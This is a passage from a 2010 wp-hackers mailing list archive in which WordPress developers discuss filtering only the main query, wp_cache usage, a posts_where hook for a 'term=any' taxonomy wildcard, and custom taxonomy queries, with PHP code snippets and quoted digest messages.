Whether John uses pre_get_posts or parse_request/request he still has the same problem; how to tell which is the "main" loop?  It's a great "Best Practices" question, actually.

As we use WordPress for a lot more patterns besides just blogging there are emerging lots of use-cases that the global nature of some of these hooks makes difficult. I've struggled with figuring out to write robust code because it seems most of the time I'm just inspecting "artifacts" (i.e. testing some object property for some value that I discover it has in my use-cases but unsure or unaware if it will always be true.) Coming up with a set of "well known solutions" for these main hooks would be rather helpful.

For example, one solution that comes to mind for John is to use a static (or global) "flag" variable initially set to false or unset and then change it to flag that you've made it through the main query's loop.  But are there ever queries that may run before the main loop, and if so it will break this logic.

Back to John's question; how to determine if your hook is in the "main" loop; what artifacts does one inspect?

-Mike


From johnbillion+wp at gmail.com  Mon Jul 26 19:38:38 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 26 Jul 2010 20:38:38 +0100
Subject: [wp-hackers] Applying a filter to the main loop only
In-Reply-To: <73EB6839-5577-4A7C-9034-4955AD0C71BA@newclarity.net>
References: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>
	<AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com>
	<73EB6839-5577-4A7C-9034-4955AD0C71BA@newclarity.net>
Message-ID: <AANLkTi=8T_d+f2Gx5hbA-LaUwnND6+WJne2qGKMqN8Pc@mail.gmail.com>

On Mon, Jul 26, 2010 at 7:24 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
>
> Whether John uses pre_get_posts or parse_request/request he still has the same problem; how to tell which is the "main" loop? ?It's a great "Best Practices" question, actually.
>
> As we use WordPress for a lot more patterns besides just blogging there are emerging lots of use-cases that the global nature of some of these hooks makes difficult. I've struggled with figuring out to write robust code because it seems most of the time I'm just inspecting "artifacts" (i.e. testing some object property for some value that I discover it has in my use-cases but unsure or unaware if it will always be true.) Coming up with a set of "well known solutions" for these main hooks would be rather helpful.

Spot on, Mike. I find myself grepping through WordPress all the time
to find the hooks and functions that I need and coming to my own
conclusions about which hooks and filters are most appropriate. An
archive of best practices aimed at plugin and theme developers (as
mentioned in another thread) would save people a lot of time (and I'd
be very willing to contribute to it).

> For example, one solution that comes to mind for John is to use a static (or global) "flag" variable initially set to false or unset and then change it to flag that you've made it through the main query's loop. ?But are there ever queries that may run before the main loop, and if so it will break this logic.

Yeah your second point was my main problem; There are potentially
loops that run both before and after the main loop so it's not just a
case of assuming the first loop is the main loop as using a flag.

> Back to John's question; how to determine if your hook is in the "main" loop; what artifacts does one inspect?

I've determined that the 'request' filter is the best fit here as it's
a filter on the main request parameters (ie. the results of parsing
the query string) and therefore only affects the main loop. The
'parse_request' filter is similar but includes additional parameters
that I didn't need in my scenario.

John

From otto at ottodestruct.com  Mon Jul 26 19:42:29 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 26 Jul 2010 14:42:29 -0500
Subject: [wp-hackers] Applying a filter to the main loop only
In-Reply-To: <AANLkTi=8T_d+f2Gx5hbA-LaUwnND6+WJne2qGKMqN8Pc@mail.gmail.com>
References: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com> 
	<AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com> 
	<73EB6839-5577-4A7C-9034-4955AD0C71BA@newclarity.net>
	<AANLkTi=8T_d+f2Gx5hbA-LaUwnND6+WJne2qGKMqN8Pc@mail.gmail.com>
Message-ID: <AANLkTikNgR=dY4P9Q0zhb8Dp6yPsJpfNbmhxxrqZ=QET@mail.gmail.com>

Hang on, I'm confused...

You guys keep mentioning the main "loop", but then go on to talk about
modifying the query for it and such. But the main post SELECT query is
run and done before the template is ever called, certainly before you
ever get to any "loop". It helps determine what template is called, in
fact.

So maybe I'm misunderstanding what you're talking about here, but the
first query is always the main one, unless it's modified by a plugin.
The Loop just displays posts from that already-run query.

-Otto



On Mon, Jul 26, 2010 at 2:38 PM, John Blackbourn
<johnbillion+wp at gmail.com> wrote:
> On Mon, Jul 26, 2010 at 7:24 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>>
>> Whether John uses pre_get_posts or parse_request/request he still has the same problem; how to tell which is the "main" loop? ?It's a great "Best Practices" question, actually.
>>
>> As we use WordPress for a lot more patterns besides just blogging there are emerging lots of use-cases that the global nature of some of these hooks makes difficult. I've struggled with figuring out to write robust code because it seems most of the time I'm just inspecting "artifacts" (i.e. testing some object property for some value that I discover it has in my use-cases but unsure or unaware if it will always be true.) Coming up with a set of "well known solutions" for these main hooks would be rather helpful.
>
> Spot on, Mike. I find myself grepping through WordPress all the time
> to find the hooks and functions that I need and coming to my own
> conclusions about which hooks and filters are most appropriate. An
> archive of best practices aimed at plugin and theme developers (as
> mentioned in another thread) would save people a lot of time (and I'd
> be very willing to contribute to it).
>
>> For example, one solution that comes to mind for John is to use a static (or global) "flag" variable initially set to false or unset and then change it to flag that you've made it through the main query's loop. ?But are there ever queries that may run before the main loop, and if so it will break this logic.
>
> Yeah your second point was my main problem; There are potentially
> loops that run both before and after the main loop so it's not just a
> case of assuming the first loop is the main loop as using a flag.
>
>> Back to John's question; how to determine if your hook is in the "main" loop; what artifacts does one inspect?
>
> I've determined that the 'request' filter is the best fit here as it's
> a filter on the main request parameters (ie. the results of parsing
> the query string) and therefore only affects the main loop. The
> 'parse_request' filter is similar but includes additional parameters
> that I didn't need in my scenario.
>
> John
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From johnbillion+wp at gmail.com  Mon Jul 26 19:49:37 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 26 Jul 2010 20:49:37 +0100
Subject: [wp-hackers] Applying a filter to the main loop only
In-Reply-To: <AANLkTikNgR=dY4P9Q0zhb8Dp6yPsJpfNbmhxxrqZ=QET@mail.gmail.com>
References: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>
	<AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com>
	<73EB6839-5577-4A7C-9034-4955AD0C71BA@newclarity.net>
	<AANLkTi=8T_d+f2Gx5hbA-LaUwnND6+WJne2qGKMqN8Pc@mail.gmail.com>
	<AANLkTikNgR=dY4P9Q0zhb8Dp6yPsJpfNbmhxxrqZ=QET@mail.gmail.com>
Message-ID: <AANLkTi=e3=r=rcjaCEN=ZyGjeCNvQbqme4xTHZRxcEL4@mail.gmail.com>

On Mon, Jul 26, 2010 at 8:42 PM, Otto <otto at ottodestruct.com> wrote:
> Hang on, I'm confused...
>
> You guys keep mentioning the main "loop", but then go on to talk about
> modifying the query for it and such. But the main post SELECT query is
> run and done before the template is ever called, certainly before you
> ever get to any "loop". It helps determine what template is called, in
> fact.

That's true but I wanted a filter on the get_posts parameters, not on
the SQL query itself.

My original question was regarding pre_get_posts, which is called as
and when each loop is performed - hence why it's not possible to
determine whether you're on the main loop or an additional loop. Using
the request or parse_request filters as suggested by Andrew Nacin gets
around this issue.

> So maybe I'm misunderstanding what you're talking about here, but the
> first query is always the main one, unless it's modified by a plugin.
> The Loop just displays posts from that already-run query.
>
> -Otto
>

From jeff at jeffrose.ca  Mon Jul 26 20:29:04 2010
From: jeff at jeffrose.ca (Jeff Rose)
Date: Mon, 26 Jul 2010 13:29:04 -0700
Subject: [wp-hackers] wp_cache function tutorials?
Message-ID: <AANLkTikj9xwBh0T_BDyMuZKZ6_4rDZ7_M+goOHT=fNu1@mail.gmail.com>

Just wondering if anyone has resources or tutorials for the various wp_cache
functions or information on those versus using transients etc?

For example, if my blog/site was going to allow people to search a song list
(custom table of 20,000+ items) - should I cache it and how? That's just an
example for size though.

I've read the codex, but it's a little thin on practical use.

Jeff

From mikeschinkel at newclarity.net  Mon Jul 26 20:56:30 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 16:56:30 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com>
	<AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local>
Message-ID: <C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>

Hi Kris:

I was intrigued to find a solution for "taxonomy=clients" and "term=any" where "any" is a wildcard (WP_Query() supports "any" as a wildcard for post_types but not for terms of a taxonomy.)

Here's a hook that adds an "any" wildcard for terms for a taxonomy assuming some other plugin didn't muck with the " AND 0 " inserted into the WHERE clause when a taxonomy term doesn't match:

add_action('posts_where','my_posts_where',10,2);

function my_posts_where($where,$query) {
	if (isset($query->query_vars['taxonomy']) && $query->query_vars['term']=='any') {
		global $wpdb;
		$tt = $wpdb->term_taxonomy;
		$tr = $wpdb->term_relationships;
		$where .= $wpdb->prepare(" AND {$wpdb->posts}.ID IN (
						SELECT object_id FROM $tr
						INNER JOIN $tt ON $tt.term_taxonomy_id = $tr.term_taxonomy_id
						WHERE $tt.taxonomy=%s) ",$query->query_vars['taxonomy']);
		$where = str_replace(' AND 0 ','',$where);
	}
	return $where;
}

Your query for this would look like this:

$posts = new WP_Query("post_type=portfolio_item&taxonomy=clients&term=any&posts_per_page=-1");

Or like this:

$posts = new WP_Query(array(
	'post_type' => 'portfolio_item',
	'taxonomy' => 'clients',
	'term' => 'any',
	'posts_per_page' => -1,
));

It works but unfortunately it's not very robust because of the need to remove the " AND 0 " from the WHERE clause because there are other reasons get_posts() adds " AND 0 ".  If query natively supported "term=any" or at least if there was a hook in /wp-includes/query.php (lines 2049 and 2068) that allowed us to target this specifically it might be better; if any of the core team agree I'll add a ticket to trac.

Alternate, maybe someone else knows a better way I didn't discover?

-Mike


On Jul 26, 2010, at 10:53 AM, Kris Young wrote:

> I was as nice as I could be in my original mail without getting
> frustrated - it really helps though that someone else is having the same
> problem though. I honestly think this whole process was a lot more
> complicated than it should have been.
> 
> Thanks for your solution - I will do my best to take a look at it today,
> and will let you know when I make some progress. Thanks again, and also
> to Mike Schinkel for the same.
> 
> Kris
> 
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jared
> Williams
> Sent: 26 July 2010 14:23
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
> 
> I have a wp_nav_menu, and it has two top level pages that have a bunch
> of
> terms I've created for two custom taxonomies, which are for the two top
> level pages. I'm trying to figure out how I can hide the terms from the
> drop
> down menu I made that shows the terms, if there are no posts assigned to
> a
> term of the taxonomies. Is this possible? It doesn't seem like it is.
> 
> 
> As for Kris Young's question about showing all posts of a taxonomy, this
> is
> a problem I ran into as well, and searched for a long time and found it
> very
> hard to figure out.
> 
> What I managed to do is list all terms for a taxonomy, and all the posts
> for
> each term individually. You may be able to hack this to do what you're
> trying to do since it is the same as what I needed to do I just didn't
> have
> time to make it list only the posts for the taxonomy.
> 
> 
> <?php
> // Create list of taxonomy terms and list the posts under each term
> $post_type = 'post';
> $tax = 'your_custom_taxonomy';
> $tax_terms = get_terms( $tax );
> if ($tax_terms) {
>    foreach ($tax_terms  as $tax_term) {
>    $args = array(
>        'post_type' => $post_type,
>        "tax" => $tax_term->slug,
>        'post_status' => 'publish',
>        'posts_per_page' => -1,
>        'caller_get_posts'=> 1
>    );
> 
>        $my_query = null;
>        $my_query = new WP_Query($args);
> 
>        if( $my_query->have_posts() ) : ?>
> 
>            <h2 class="breadcrumb">All <?php echo $tax; ?> Posts For
> <?php
> echo $tax_term->name; ?></h2>
>            <ul class="taxlist">
>            <?php while ( $my_query->have_posts() ) :
> $my_query->the_post();
> ?>
> 
>                <li id="post-<?php the_ID(); ?>">
>                    <a href="<?php the_permalink(); ?>" rel="bookmark"
> title="Permanent Link to <?php the_title_attribute(); ?>"><?php
> the_title();
> ?></a>
>                </li>
> 
> 
>            <?php endwhile; // end of loop ?>
>            </ul>
> 
>            <?php if( function_exists('wp_pagenavi')) { wp_pagenavi(); }
> else { ?>
>                <div class="navigation clearfix">
>                    <div class="alignleft"><?php
> next_posts_link('&laquo;
> Previous Entries') ?></div>
>                    <div class="alignright"><?php
> previous_posts_link('Next
> Entries &raquo;') ?></div>
>                </div>
>            <?php } ?>
> 
>        <?php else : ?>
> 
>            <h2 class="title">Oops</h2>
>            <p>Looks like something is missing...</p>
> 
>        <?php endif; // if have_posts()
>        wp_reset_query();
> 
>    } // end foreach #tax_terms
> }
> ?>
> 
> Hope this helps.
> 
> Jared Williams
> 
> 
> On Mon, Jul 26, 2010 at 8:00 AM,
> <wp-hackers-request at lists.automattic.com>wrote:
> 
>> Send wp-hackers mailing list submissions to
>>       wp-hackers at lists.automattic.com
>> 
>> To subscribe or unsubscribe via the World Wide Web, visit
>>       http://lists.automattic.com/mailman/listinfo/wp-hackers
>> or, via email, send a message with subject or body 'help' to
>>       wp-hackers-request at lists.automattic.com
>> 
>> You can reach the person managing the list at
>>       wp-hackers-owner at lists.automattic.com
>> 
>> When replying, please edit your Subject line so it is more specific
>> than "Re: Contents of wp-hackers digest..."
>> 
>> 
>> Today's Topics:
>> 
>>  1. Re: Custom post types - a multitude of problems (Mike Schinkel)
>>  2. Querying posts of another WordPress install (Ashish Saini)
>>  3. Re: Querying posts of another WordPress install (Ashish Saini)
>>  4. Re: Querying posts of another WordPress install (Aaron Jorbin)
>> 
>> 
>> ----------------------------------------------------------------------
>> 
>> Message: 1
>> Date: Mon, 26 Jul 2010 06:06:14 -0400
>> From: Mike Schinkel <mikeschinkel at newclarity.net>
>> Subject: Re: [wp-hackers] Custom post types - a multitude of problems
>> To: wp-hackers at lists.automattic.com
>> Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7 at newclarity.net>
>> Content-Type: text/plain;       charset=us-ascii
>> 
>> On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
>>> I need to output the contents (all posts, all content of those
> posts) of
>>> a specific custom category (taxonomy) and I have no idea how to get
> it
>>> done. All I want is a page that outputs all the posts for a certain
>>> category (and that category only) that I created using this code:
>>> 
>>> register_taxonomy("clients", array("portfolio_item"),
>>> array("hierarchical" => true, "label" => "Clients", "singular_label"
> =>
>>> "Client", "rewrite" => array('slug'=>'portfolio_item')));
>>> 
>>> Yes, that part was simple, but for some reason my custom taxonomy is
>>> completely separate from the rest of the site and irretrievable.
> Can't
>>> figure out for the life of me how to do this.
>> 
>> To start, I think you have your taxonomy registration wrong. (FWIW my
>> preference would be to go with a singular for the taxonomy name, e.g.
>> "client" but I'll leave yours as is):
>> 
>> $labels = array(
>>   'name' => _x( 'Clients', 'taxonomy general name' ),
>>   'singular_name' => _x( 'Client', 'taxonomy singular name' ),
>>   'search_items' =>  __( 'Search Clients' ),
>>   'all_items' => __( 'All Clients' ),
>>   'parent_item' => __( 'Parent Client' ),
>>   'parent_item_colon' => __( 'Parent Client:' ),
>>   'edit_item' => __( 'Edit Client' ),
>>   'update_item' => __( 'Update Client' ),
>>   'add_new_item' => __( 'Add New Client' ),
>>   'new_item_name' => __( 'New Client Name' ),
>> );
>> 
>> register_taxonomy("clients", array("portfolio_item"),array(
>>       "hierarchical" => true,
>>       "labels" => $labels,
>>       "public" => true,
>>       "show_ui" => true,
>>       "query_var" => "clients",
>>       "rewrite" => array('slug'=>'client'),
>> ));
>> 
>> Many of these options will default but I went ahead and listed them
> all.
>> Read more here:
>> 
>> http://codex.wordpress.org/Function_Reference/register_taxonomy
>> 
>> As for the rest of your question, I'm unclear.  Do you want all
> Portfolio
>> Items that have *any* clients, or a specific client?  For a specific
> client
>> i.e. "john-smith" I think this would be what you need (though I
> haven't run
>> the code so it may have typos):
>> 
>> <?php
>> $portfolio_items = new
>> 
> WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&post
> s_per_page=-1');
>> if ( $portfolio_items->have_posts() ):
>>       while ( $portfolio_items->have_posts() ) :
>> $portfolio_items->the_post(); ?>
>>               <h2 id="post-<?php the_ID(); ?>" <?php post_class();
>> ?>><?php the_title(); ?></h2>
>>               <?php the_content();
>>       endwhile;
>> endif;
>> 
>> If you want to get all portfolio items that have *any* clients I've
>> actually not done that before so I'll have to let someone else answer.
>> 
>> HTH.
>> 
>> -Mike
>> 
>> ------------------------------
>> 
>> Message: 2
>> Date: Mon, 26 Jul 2010 17:08:30 +0530
>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>> Subject: [wp-hackers] Querying posts of another WordPress install
>> To: wp-hackers <wp-hackers at lists.automattic.com>
>> Message-ID:
>>       <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS at mail.gmail.com>
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> Hi,
>> 
>> Is there any way that I can query posts from another WordPress install
>> residing in the same database? I know it can be done via SQL queries
> but is
>> there any workaround hacking my way along with API?
>> 
>> Thanks & Regards
>> Ashish Saini aka Ashfame
>> (Deserve Before You Desire)
>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>> Twitter
>> : http://twitter.com/ashfame
>> 
>> 
>> ------------------------------
>> 
>> Message: 3
>> Date: Mon, 26 Jul 2010 17:12:22 +0530
>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>> Subject: Re: [wp-hackers] Querying posts of another WordPress install
>> To: wp-hackers <wp-hackers at lists.automattic.com>
>> Message-ID:
>>       <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA at mail.gmail.com>
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> I think this can be done with the help of setup_postdata() by
> populating
>> the
>> fields as explained here -
>> 
> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>> 
>> Right? And is this the best approach?
>> 
>> Thanks & Regards
>> Ashish Saini aka Ashfame
>> (Deserve Before You Desire)
>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>> Twitter
>> : http://twitter.com/ashfame
>> 
>> 
>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>> <ashishsainiashfame at gmail.com>wrote:
>> 
>>> Hi,
>>> 
>>> Is there any way that I can query posts from another WordPress
> install
>>> residing in the same database? I know it can be done via SQL queries
> but
>> is
>>> there any workaround hacking my way along with API?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter : http://twitter.com/ashfame
>>> 
>> 
>> 
>> ------------------------------
>> 
>> Message: 4
>> Date: Mon, 26 Jul 2010 07:56:17 -0400
>> From: Aaron Jorbin <aaron at jorb.in>
>> Subject: Re: [wp-hackers] Querying posts of another WordPress install
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt at mail.gmail.com>
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> Is this using Multisite?  If so, you can use switch_to_blog -
>> http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
>> counterpart restore_current_blog -
>> http://codex.wordpress.org/WPMU_Functions/restore_current_blog to move
>> around use the api.
>> 
>> 
>> 
>> http://aaron.jorb.in
>> twitter: twitter.com/aaronjorbin
>> 
>> 
>> On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
>> <ashishsainiashfame at gmail.com>wrote:
>> 
>>> I think this can be done with the help of setup_postdata() by
> populating
>>> the
>>> fields as explained here -
>>> 
> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>> 
>>> Right? And is this the best approach?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> Hi,
>>>> 
>>>> Is there any way that I can query posts from another WordPress
> install
>>>> residing in the same database? I know it can be done via SQL
> queries
>> but
>>> is
>>>> there any workaround hacking my way along with API?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
> |
>>>> Twitter : http://twitter.com/ashfame
>>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
>> 
>> ------------------------------
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> 
>> End of wp-hackers Digest, Vol 66, Issue 101
>> *******************************************
>> 
> 
> 
> 
> -- 
> Thank you,
> 
> Jared Williams
> Web/Graphic Designer
> Tweeaks.com  |  New2WP.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Mon Jul 26 20:57:58 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 16:57:58 -0400
Subject: [wp-hackers] wp_cache function tutorials?
In-Reply-To: <AANLkTikj9xwBh0T_BDyMuZKZ6_4rDZ7_M+goOHT=fNu1@mail.gmail.com>
References: <AANLkTikj9xwBh0T_BDyMuZKZ6_4rDZ7_M+goOHT=fNu1@mail.gmail.com>
Message-ID: <FB044D63-7809-4820-A5F9-BEBE22247D84@newclarity.net>

On Jul 26, 2010, at 4:29 PM, Jeff Rose wrote:
> Just wondering if anyone has resources or tutorials for the various wp_cache
> functions or information on those versus using transients etc?
> 
> For example, if my blog/site was going to allow people to search a song list
> (custom table of 20,000+ items) - should I cache it and how? That's just an
> example for size though.

Just curious and off topic a bit, but why not a custom post type of "song?"  Then some of the same caching algorithms would kick in (as well as many other wonderful benefits. :)


-Mike

From charles at cefm.ca  Mon Jul 26 21:05:56 2010
From: charles at cefm.ca (Charles Frees-Melvin)
Date: Mon, 26 Jul 2010 18:05:56 -0300
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com>
	<AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local>
	<C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>
Message-ID: <8DA7CE0E-3C39-4F15-9788-514DEE054F09@cefm.ca>

Not to flog a dead horse (or stubborn mule, you decide) would it not just make it a lot easier to combine wp_terms and wp_term_taxonomy into wp_terms and add a wp_termmeta and eliminate wp_term_relationships and have 1 function to get everything in one table and another for meta?

---
Charles E. Frees-Melvin
www.cefm.ca

On 2010-07-26, at 5:56 PM, Mike Schinkel wrote:

> Hi Kris:
> 
> I was intrigued to find a solution for "taxonomy=clients" and "term=any" where "any" is a wildcard (WP_Query() supports "any" as a wildcard for post_types but not for terms of a taxonomy.)
> 
> Here's a hook that adds an "any" wildcard for terms for a taxonomy assuming some other plugin didn't muck with the " AND 0 " inserted into the WHERE clause when a taxonomy term doesn't match:
> 
> add_action('posts_where','my_posts_where',10,2);
> 
> function my_posts_where($where,$query) {
> 	if (isset($query->query_vars['taxonomy']) && $query->query_vars['term']=='any') {
> 		global $wpdb;
> 		$tt = $wpdb->term_taxonomy;
> 		$tr = $wpdb->term_relationships;
> 		$where .= $wpdb->prepare(" AND {$wpdb->posts}.ID IN (
> 						SELECT object_id FROM $tr
> 						INNER JOIN $tt ON $tt.term_taxonomy_id = $tr.term_taxonomy_id
> 						WHERE $tt.taxonomy=%s) ",$query->query_vars['taxonomy']);
> 		$where = str_replace(' AND 0 ','',$where);
> 	}
> 	return $where;
> }
> 
> Your query for this would look like this:
> 
> $posts = new WP_Query("post_type=portfolio_item&taxonomy=clients&term=any&posts_per_page=-1");
> 
> Or like this:
> 
> $posts = new WP_Query(array(
> 	'post_type' => 'portfolio_item',
> 	'taxonomy' => 'clients',
> 	'term' => 'any',
> 	'posts_per_page' => -1,
> ));
> 
> It works but unfortunately it's not very robust because of the need to remove the " AND 0 " from the WHERE clause because there are other reasons get_posts() adds " AND 0 ".  If query natively supported "term=any" or at least if there was a hook in /wp-includes/query.php (lines 2049 and 2068) that allowed us to target this specifically it might be better; if any of the core team agree I'll add a ticket to trac.
> 
> Alternate, maybe someone else knows a better way I didn't discover?
> 
> -Mike
> 
> 
> On Jul 26, 2010, at 10:53 AM, Kris Young wrote:
> 
>> I was as nice as I could be in my original mail without getting
>> frustrated - it really helps though that someone else is having the same
>> problem though. I honestly think this whole process was a lot more
>> complicated than it should have been.
>> 
>> Thanks for your solution - I will do my best to take a look at it today,
>> and will let you know when I make some progress. Thanks again, and also
>> to Mike Schinkel for the same.
>> 
>> Kris
>> 
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jared
>> Williams
>> Sent: 26 July 2010 14:23
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
>> 
>> I have a wp_nav_menu, and it has two top level pages that have a bunch
>> of
>> terms I've created for two custom taxonomies, which are for the two top
>> level pages. I'm trying to figure out how I can hide the terms from the
>> drop
>> down menu I made that shows the terms, if there are no posts assigned to
>> a
>> term of the taxonomies. Is this possible? It doesn't seem like it is.
>> 
>> 
>> As for Kris Young's question about showing all posts of a taxonomy, this
>> is
>> a problem I ran into as well, and searched for a long time and found it
>> very
>> hard to figure out.
>> 
>> What I managed to do is list all terms for a taxonomy, and all the posts
>> for
>> each term individually. You may be able to hack this to do what you're
>> trying to do since it is the same as what I needed to do I just didn't
>> have
>> time to make it list only the posts for the taxonomy.
>> 
>> 
>> <?php
>> // Create list of taxonomy terms and list the posts under each term
>> $post_type = 'post';
>> $tax = 'your_custom_taxonomy';
>> $tax_terms = get_terms( $tax );
>> if ($tax_terms) {
>>   foreach ($tax_terms  as $tax_term) {
>>   $args = array(
>>       'post_type' => $post_type,
>>       "tax" => $tax_term->slug,
>>       'post_status' => 'publish',
>>       'posts_per_page' => -1,
>>       'caller_get_posts'=> 1
>>   );
>> 
>>       $my_query = null;
>>       $my_query = new WP_Query($args);
>> 
>>       if( $my_query->have_posts() ) : ?>
>> 
>>           <h2 class="breadcrumb">All <?php echo $tax; ?> Posts For
>> <?php
>> echo $tax_term->name; ?></h2>
>>           <ul class="taxlist">
>>           <?php while ( $my_query->have_posts() ) :
>> $my_query->the_post();
>> ?>
>> 
>>               <li id="post-<?php the_ID(); ?>">
>>                   <a href="<?php the_permalink(); ?>" rel="bookmark"
>> title="Permanent Link to <?php the_title_attribute(); ?>"><?php
>> the_title();
>> ?></a>
>>               </li>
>> 
>> 
>>           <?php endwhile; // end of loop ?>
>>           </ul>
>> 
>>           <?php if( function_exists('wp_pagenavi')) { wp_pagenavi(); }
>> else { ?>
>>               <div class="navigation clearfix">
>>                   <div class="alignleft"><?php
>> next_posts_link('&laquo;
>> Previous Entries') ?></div>
>>                   <div class="alignright"><?php
>> previous_posts_link('Next
>> Entries &raquo;') ?></div>
>>               </div>
>>           <?php } ?>
>> 
>>       <?php else : ?>
>> 
>>           <h2 class="title">Oops</h2>
>>           <p>Looks like something is missing...</p>
>> 
>>       <?php endif; // if have_posts()
>>       wp_reset_query();
>> 
>>   } // end foreach #tax_terms
>> }
>> ?>
>> 
>> Hope this helps.
>> 
>> Jared Williams
>> 
>> 
>> On Mon, Jul 26, 2010 at 8:00 AM,
>> <wp-hackers-request at lists.automattic.com>wrote:
>> 
>>> Send wp-hackers mailing list submissions to
>>>      wp-hackers at lists.automattic.com
>>> 
>>> To subscribe or unsubscribe via the World Wide Web, visit
>>>      http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> or, via email, send a message with subject or body 'help' to
>>>      wp-hackers-request at lists.automattic.com
>>> 
>>> You can reach the person managing the list at
>>>      wp-hackers-owner at lists.automattic.com
>>> 
>>> When replying, please edit your Subject line so it is more specific
>>> than "Re: Contents of wp-hackers digest..."
>>> 
>>> 
>>> Today's Topics:
>>> 
>>> 1. Re: Custom post types - a multitude of problems (Mike Schinkel)
>>> 2. Querying posts of another WordPress install (Ashish Saini)
>>> 3. Re: Querying posts of another WordPress install (Ashish Saini)
>>> 4. Re: Querying posts of another WordPress install (Aaron Jorbin)
>>> 
>>> 
>>> ----------------------------------------------------------------------
>>> 
>>> Message: 1
>>> Date: Mon, 26 Jul 2010 06:06:14 -0400
>>> From: Mike Schinkel <mikeschinkel at newclarity.net>
>>> Subject: Re: [wp-hackers] Custom post types - a multitude of problems
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7 at newclarity.net>
>>> Content-Type: text/plain;       charset=us-ascii
>>> 
>>> On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
>>>> I need to output the contents (all posts, all content of those
>> posts) of
